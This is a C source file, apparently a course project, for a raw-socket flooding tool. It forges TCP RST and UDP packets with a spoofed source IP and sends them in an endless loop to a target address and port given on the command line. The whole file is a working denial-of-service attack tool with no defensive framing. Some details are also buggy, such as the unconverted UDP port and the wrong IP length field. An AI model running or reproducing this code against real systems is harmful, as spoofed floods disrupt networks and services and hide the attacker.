#include <stdio.h>
#include <string.h> 
#include <sys/socket.h>
#include <stdlib.h> 
#include <errno.h> 
#include <netinet/tcp.h>	
#include <netinet/ip.h>	
#include <netinet/udp.h> 
#include <netinet/in.h> 
#include <time.h>


unsigned short csum(unsigned short *ptr,int nbytes);
void send_tcp(char* destination_ip, int destination_port);
void send_udp(char* destination_ip, int destination_port);


char* destination_ip;
int destination_port;

//needed for checksum calculation
struct pseudo_header    
{
	unsigned int source_address;
	unsigned int dest_address;
	unsigned char placeholder;
	unsigned char protocol;
	unsigned short tcp_length;
	
	struct tcphdr tcp;
};

// the regular checksum
unsigned short csum(unsigned short *ptr,int nbytes) 
{
	register long sum;
	unsigned short oddbyte;
	register short answer;

	sum=0;
	while(nbytes>1) {
		sum+=*ptr++;
		nbytes-=2;
	}
	if(nbytes==1) {
		oddbyte=0;
		*((u_char*)&oddbyte)=*(u_char*)ptr;
		sum+=oddbyte;
	}

	sum = (sum>>16)+(sum & 0xffff);
	sum = sum + (sum>>16);
	answer=(short)~sum;
	
	return(answer);
}

int main(int argc,char* argv[])
{
	srand(time(0));
	int UDP_flag = 0;
	
	// [-t ip_address -p port_number -r] case
	if(argc == 6 && strcmp(argv[1], "-t") == 0 && strcmp(argv[3], "-p") == 0 && strcmp(argv[5], "-r") == 0)
	{
		destination_ip = argv[2];
		destination_port = atoi(argv[4]);
		UDP_flag = 1;
		while(1)
		{
			send_udp(destination_ip, destination_port);
		}
	}
	// [-t ip_address -p port_number] case
	else if(argc == 5 && strcmp(argv[1], "-t") == 0 && strcmp(argv[3], "-p") == 0)
	{
		destination_ip = argv[2];
		destination_port = atoi(argv[4]);
		while(1)
		{
			send_tcp(destination_ip, destination_port);
		}
	}
	// [-t ip_address -r] case
	else if(argc == 4 && strcmp(argv[1], "-t") == 0 && strcmp(argv[3], "-r") == 0)
	{
		destination_ip = argv[2];
		destination_port = 443;
		UDP_flag = 1;
		while(1)
		{
			send_udp(destination_ip, destination_port);
		}
	}
	// [-p port_number -r] case
	else if(argc == 4 && strcmp(argv[1], "-p") == 0 && strcmp(argv[3], "-r") == 0)
	{
		destination_ip = "127.0.0.1";
		destination_port = atoi(argv[2]);
		UDP_flag = 1;
		while(1)
		{
			send_udp(destination_ip, destination_port);
		}
	}
	// [-t ip_address] case
	else if(argc == 3 && strcmp(argv[1], "-t") == 0)
	{
		destination_ip = argv[2];
		destination_port = 443;
		while(1)
		{
			send_tcp(destination_ip, destination_port);
		}
	}
	// [-p port_number] case
	else if(argc == 3 && strcmp(argv[1], "-p") == 0)
	{
		destination_ip = "127.0.0.1";
		destination_port = atoi(argv[2]);
		while(1)
		{
			send_tcp(destination_ip, destination_port);
		}
	}
	// [-r] case
	else if(argc == 2 && strcmp(argv[1], "-r") == 0)
	{
		destination_ip = "127.0.0.1";
		destination_port = 443;
		UDP_flag = 1;
		while(1)
		{
			send_udp(destination_ip, destination_port);
		}
	}
	// [] case
	else if(argc == 1)
	{
		destination_ip = "127.0.0.1";
		destination_port = 443;
		while(1)
		{
			send_tcp(destination_ip, destination_port);
		}
	}
	else
	{
		printf("syntax Error. \n please insert '-t ip_address (optional) -p port_number (optional) -r (optional)' \n if not specified default ip_address is 127.0.0.1 and default port_number is 443 \n");
	}
	
	//printf("%s \n", destination_ip);
	//printf("%d \n", destination_port);
	//printf("%d \n", UDP_flag);
}

//Wrote by Matan Greenberg
void send_tcp(char* destination_ip, int destination_port)
{
	//Create a raw socket
	int s = socket (AF_INET, SOCK_RAW, IPPROTO_RAW);
	if (s == -1) 
	{
		fprintf(stderr,"socket() error, root ?\n");
	}
	
	//Datagram of the packet
	char datagram[4096] , source_ip[32];
	
	//IP header
	struct iphdr *ip_header = (struct iphdr *) datagram;
	
	//TCP header
	struct tcphdr *tcp_header = (struct tcphdr *) (datagram + sizeof (struct ip));
	struct sockaddr_in sin;
	struct pseudo_header psh;
	
	strcpy(source_ip , "222.111.111.111");
  
	sin.sin_family = AF_INET;
	sin.sin_port = htons(222);
	sin.sin_addr.s_addr = inet_addr (destination_ip);
	
	//zero out the buffer 
	memset (datagram, 0, 4096);	
	
	//Fill the IP Header
	ip_header->ihl = 5;
	ip_header->version = 4;
	ip_header->tos = 0; //0x08
	ip_header->tot_len = sizeof (struct ip) + sizeof (struct tcphdr);
	ip_header->id = rand();	//we give this packet random id
	ip_header->frag_off = 0;
	ip_header->ttl = 255;
	ip_header->protocol = IPPROTO_TCP;
	ip_header->check = 0;		//before calculating checksum
	ip_header->saddr = inet_addr ( source_ip );	//We spoof the source ip address
	ip_header->daddr = sin.sin_addr.s_addr;
	
	ip_header->check = csum ((unsigned short *) datagram, ip_header->tot_len >> 1);
	
	//TCP Header
	tcp_header->source = htons (222);
	tcp_header->dest = htons (destination_port);
	tcp_header->seq = rand();
	tcp_header->ack_seq = 0;
	tcp_header->doff = 5;		
	tcp_header->fin=0;
	tcp_header->syn=0;
	tcp_header->rst=1;
	tcp_header->psh=0;
	tcp_header->ack=0;
	tcp_header->urg=0;
	tcp_header->window = htons (65535);	//Maximum window size
	tcp_header->check = 0;
	tcp_header->urg_ptr = 0;
	
	
	psh.source_address = inet_addr( source_ip );
	psh.dest_address = sin.sin_addr.s_addr;
	psh.placeholder = 0;
	psh.protocol = IPPROTO_TCP;
	psh.tcp_length = htons(20);
	
	memcpy(&psh.tcp , tcp_header , sizeof (struct tcphdr));
	
	tcp_header->check = csum( (unsigned short*) &psh , sizeof (struct pseudo_header));
	
	int one = 1;
	const int *val = &one;
	if (setsockopt (s, IPPROTO_IP, IP_HDRINCL, val, sizeof (one)) < 0)
	{
		printf ("Error setting IP_HDRINCL. Error number : %d . Error message : %s \n" , errno , strerror(errno));
		exit(0);
	}
	
	//Send the packet
	if (sendto (s,datagram,ip_header->tot_len,0,(struct sockaddr *) &sin,sizeof (sin)) < 0)
	{
		printf ("error\n");
	}
	
	//Data send successfully
	else
	{
		printf ("Packet was sent to %s and port %d \n", destination_ip, destination_port);
	}
		
	close(s);
}

//Wrote by Roi Mash
void send_udp(char* destination_ip, int destination_port)
{
	int sd;
	sd = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
	if (sd == -1) 
	{
		fprintf(stderr,"socket() error, root ?\n");
	}
	
	char source_ip[32];
	strcpy(source_ip , "222.111.111.111");
	
	//ip\port source and destination
	unsigned long ip_src = inet_addr(source_ip);
	unsigned long ip_dst = inet_addr(destination_ip);
	unsigned short p_src = (unsigned short) 111;
	unsigned short p_dst = (unsigned short) destination_port;
	
	struct sockaddr_in sin;
 
	sin.sin_family = AF_INET;
	sin.sin_port = p_dst;
	sin.sin_addr.s_addr = ip_dst; // dst
	
	struct ip *ip;
	struct udphdr *udp;
	char *dgm, *data;
	
	int packet_size = sizeof(struct ip) + sizeof(struct udphdr) + 1;
	dgm = (char *) malloc(packet_size);
	ip = (struct ip *) dgm;
	udp = (struct udphdr *) (dgm + sizeof(struct ip));
	data = (char *) (dgm + sizeof(struct ip) + sizeof(struct udphdr));
	
	memset(dgm, 0, packet_size);
	memcpy((char *) data, "G", 1);
	
	int one = 1;
	if (setsockopt(sd, IPPROTO_IP, IP_HDRINCL, (char *)&one, sizeof(one)) == -1)
 	{
 		fprintf(stderr,"setsockopt()");
 		exit(-1);
 	}
 	
 	ip->ip_v = 4;
	ip->ip_hl = 5;
	ip->ip_tos = 0;  //0x08
	ip->ip_len = sizeof(packet_size);
	ip->ip_ttl = 255;
	ip->ip_off = 0;
	ip->ip_id = rand();
	ip->ip_p = IPPROTO_UDP;
	ip->ip_sum = 0; 
	ip->ip_src.s_addr = ip_src;
	ip->ip_dst.s_addr = ip_dst;
	
	udp->uh_sport = p_src;
	udp->uh_dport = p_dst;
	udp->uh_ulen = htons(sizeof(struct udphdr ) + 1);
	udp->uh_sum = 0;
	
	if (sendto(sd, dgm, packet_size, 0, (struct sockaddr *) &sin, sizeof(struct sockaddr)) < 0) 
	{
 		fprintf(stderr,"oops, sendto() error\n");
 	}
 	else
 	{
 		printf ("Packet was sent to %s and port %d \n", destination_ip, destination_port);
 	}
 	
 	free(dgm);
	close(sd);
}

